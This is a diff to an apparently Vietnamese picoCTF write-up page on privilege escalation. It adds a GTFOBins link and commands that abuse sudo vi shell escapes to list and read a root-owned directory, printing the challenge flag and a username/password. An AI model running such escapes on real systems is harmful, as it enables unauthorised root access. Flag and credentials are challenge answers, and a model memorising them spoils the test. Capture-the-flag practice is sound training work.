@@ -225,6 +225,7 @@ picoctf@challenge:/$ cd challenge/
 <li>Chỉnh sửa ngay luôn file .server.py</li>
 </ol>
 <h2 id="thực-hiện-việc-lợi-dụng-vi-để-leo-thang-đặc-quyền"><a class="header" href="#thực-hiện-việc-lợi-dụng-vi-để-leo-thang-đặc-quyền">Thực hiện việc lợi dụng vi để leo thang đặc quyền</a></h2>
+<p><a href="https://gtfobins.github.io/gtfobins/vi/">for more</a></p>
 <pre><code class="language-shell">picoctf@challenge:~$ sudo /usr/bin/vi
 
 metadata.json
@@ -242,6 +243,20 @@ Press ENTER or type command to continue
 <li><strong>:! ls /challenge/</strong></li>
 <li><strong>:! cat /challenge/metadata.json</strong></li>
 </ol>
+<p>Cụ thể hơn:</p>
+<pre><code class="language-shell">picoctf@challenge:/$ sudo  /usr/bin/vi  -c ':! ls -la /challenge'
+
+total 4
+d--------- 1 root root   6 Aug  4 21:11 .
+drwxr-xr-x 1 root root  63 Aug  5 09:05 ..
+-rw-r--r-- 1 root root 103 Aug  4 21:11 metadata.json
+
+Press ENTER or type command to continue
+picoctf@challenge:/$ sudo  /usr/bin/vi  -c ':! cat /challenge/metadata.json'
+
+{&quot;flag&quot;: &quot;picoCTF{pYth0nn_libraryH!j@CK!n9_f56dbed6}&quot;, &quot;username&quot;: &quot;picoctf&quot;, &quot;password&quot;: &quot;3aKUWQv068&quot;}
+Press ENTER or type command to continue
+</code></pre>
 <h2 id="chỉnh-sửa-file-thư-viện-để-khi-thực-thi-serverpy--thực-thi-nốt"><a class="header" href="#chỉnh-sửa-file-thư-viện-để-khi-thực-thi-serverpy--thực-thi-nốt">Chỉnh sửa file thư viện, để khi thực thi .server.py =&gt; thực thi nốt</a></h2>
 <pre><code class="language-shell">picoctf@challenge:~$ find / -name &quot;base64.py&quot;
 find: ‘/etc/ssl/private’: Permission denied
